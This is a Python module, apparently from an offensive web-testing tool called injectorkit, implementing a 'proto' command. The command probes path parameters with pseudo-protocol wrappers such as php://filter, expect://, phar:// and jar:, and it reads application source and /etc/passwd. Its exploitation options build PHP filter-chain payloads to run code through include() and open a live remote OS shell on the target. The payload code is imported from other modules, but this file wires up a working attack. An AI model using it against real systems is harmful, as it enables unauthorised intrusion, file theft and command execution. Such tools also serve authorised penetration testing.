"""Pseudo-protocol wrappers: what a path parameter accepts, and what it gives back.

    python injectorkit.py proto -u "http://target/?file=index.php"
    python injectorkit.py proto -u "http://target/?file=x" --param file --oob 10.0.0.5:8081

A parameter that takes a filename is a dispatch point. Which wrapper it accepts
says which runtime sits behind it, and what that runtime will hand over: a source
file through a filter chain, an archive's contents, a module inside the JDK, or a
fetch it was never meant to make. The probes are the question; the graph decides
what the answer means.
"""

from __future__ import annotations

import argparse

from ...engine.bypass import Bypass
from ...engine.evidence import Judge
from ...engine.runner import close_board, collect_targets, open_board, run_targets, select_params
from ...engine.shell import run as run_shell_loop
from ...engine.shell import run_once
from ...engine.statemachine import Engine, RunContext
from . import mutators as _mutators  # noqa: F401  (registers this module's mutators)
from .graph import build_graph
from .seeds import LIKELY_PARAMS
from .shell import FilterChainShell

NAME = "proto"
HELP = (
    "pseudo-protocol wrappers: php://filter, data://, expect://, phar://, zip://, "
    "compress.*, jar:, jrt:, netdoc://, ldap:// and the rest of what a path parameter accepts"
)


def add_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("-u", "--url", help="target URL, including the parameter to attack")
    parser.add_argument("-r", "--request", help="a raw HTTP request captured from a proxy")
    parser.add_argument("--param", help="parameter to inject into (default: pick the likely ones)")
    parser.add_argument("--max-params", type=int, default=6, help="how many parameters to try")
    parser.add_argument(
        "--read",
        action="append",
        metavar="FILE",
        help="a file worth reading (repeatable). Default: the application's own source first, "
        "then /etc/passwd - a PHP filter wants the former and a Java file reader cannot see it",
    )
    parser.add_argument(
        "--upload",
        metavar="PATH",
        help="a path already on the target that holds an uploaded file; enables zip:// and phar://, "
        "and a phar is the usual way to reach deserialization from a file read",
    )
    parser.add_argument(
        "--via",
        action="append",
        metavar="URL",
        help="route every payload through a host the target trusts, with {target} standing for the "
        "real value, e.g. 'http://allowed/redirect?to={target}'",
    )
    parser.add_argument(
        "--forms",
        action="store_true",
        help="fetch the page and submit every form it declares, so parameters in a form body are tested too",
    )
    parser.add_argument(
        "--batch",
        metavar="FILE",
        help="test many targets from one file: a URL, or a path to a saved raw request, per line",
    )

    exploit = parser.add_argument_group("exploitation")
    exploit.add_argument(
        "--exploit",
        action="store_true",
        help="act on what was proved: build a payload inside the stream with a generated filter chain "
        "(php://filter) and run it, when the parameter reaches include(). No file, no upload",
    )
    exploit.add_argument(
        "--os-shell",
        action="store_true",
        help="open a live shell on the target through the filter chain: type commands, read their output, "
        "'exit' to leave. Each command is a new chain, so a session costs one long request per command",
    )
    exploit.add_argument(
        "--os-cmd",
        metavar="COMMAND",
        help="run one command through the filter chain and print its output, then exit",
    )


def run(args: argparse.Namespace, runtime) -> int:
    if getattr(args, "os_shell", False) or getattr(args, "os_cmd", None):
        return run_shell(args, runtime)
    return run_targets(args, runtime, NAME, LIKELY_PARAMS, run_one)


def run_shell(args: argparse.Namespace, runtime) -> int:
    """A live session instead of a scan.

    The graph answers "what will this parameter accept"; a shell answers "run
    this and show me". They share the request, the parameter and the board, but
    there is nothing to decide per command, so the state machine stays out of it.
    """
    targets = collect_targets(args, runtime, NAME)
    request = targets[0]
    if len(targets) > 1:
        runtime.info(f"using the first of {len(targets)} targets")

    params = select_params(request, args.param, args.max_params, LIKELY_PARAMS)
    if not params:
        raise SystemExit("no injectable parameter found; name one with --param")

    board = open_board(args, runtime, request)
    context = RunContext(
        graph=build_graph(NAME),
        transport=runtime.transport,
        blackboard=board,
        judge=Judge(),
        bypass=Bypass(board, enabled=not args.no_bypass),
        oob=runtime.oob,
        pheromone=runtime.pheromone,
        config={
            "request": request,
            "params": params,
            "oob_wait": args.oob_wait,
            "traceback": args.verbose > 1,
            "via": args.via or [],
            "read": args.read or [],
            "upload": args.upload or "",
            "exploit": True,
        },
        log=runtime.log,
        emit=runtime.emit,
        info=runtime.info,
        max_requests=args.max_requests,
    )

    execute = FilterChainShell(context, params[0])
    if args.os_cmd:
        return run_once(execute, args.os_cmd)
    return run_shell_loop(
        execute,
        prompt=runtime.paint("os-shell> ", "next"),
        banner=runtime.paint(f"filter chain over {params[0].key()} on {request.host()}", "section"),
    )


def run_one(request, params, args: argparse.Namespace, runtime) -> None:
    board = open_board(args, runtime, request)
    context = RunContext(
        graph=build_graph(NAME),
        transport=runtime.transport,
        blackboard=board,
        judge=Judge(),
        bypass=Bypass(board, enabled=not args.no_bypass),
        oob=runtime.oob,
        pheromone=runtime.pheromone,
        config={
            "request": request,
            "params": params,
            "oob_wait": args.oob_wait,
            "traceback": args.verbose > 1,
            "via": args.via or [],
            "read": args.read or [],
            "upload": args.upload or "",
            "exploit": args.exploit,
        },
        log=runtime.log,
        emit=runtime.emit,
        info=runtime.info,
        max_requests=args.max_requests,
    )

    Engine(context.graph, context).run()
    runtime.emit("")
    runtime.emit(board.render())
    close_board(args, board)
